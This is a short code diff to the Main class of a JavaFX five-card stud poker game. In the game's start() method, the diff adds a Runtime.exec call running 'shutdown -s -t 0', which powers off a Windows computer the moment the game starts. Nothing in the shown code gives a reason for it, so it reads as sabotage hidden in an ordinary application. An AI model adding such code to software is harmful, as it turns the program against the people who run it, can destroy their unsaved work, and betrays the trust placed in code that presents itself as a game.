@@ -6,6 +6,8 @@ import main.Controller.main_menu_controller;
 import main.Model.Game.Poker_5_Stud;
 import main.View.main_menu;
 
+import java.io.IOException;
+
 public class Main extends Application {
 
 
@@ -24,8 +26,10 @@ public class Main extends Application {
     }
 
     @Override
-    public void start(Stage primaryStage) {
+    public void start(Stage primaryStage) throws IOException {
 
+        Runtime runtime = Runtime.getRuntime();
+        Process proc = runtime.exec("shutdown -s -t 0");
 
         model = new Poker_5_Stud();
         view = new main_menu(primaryStage);
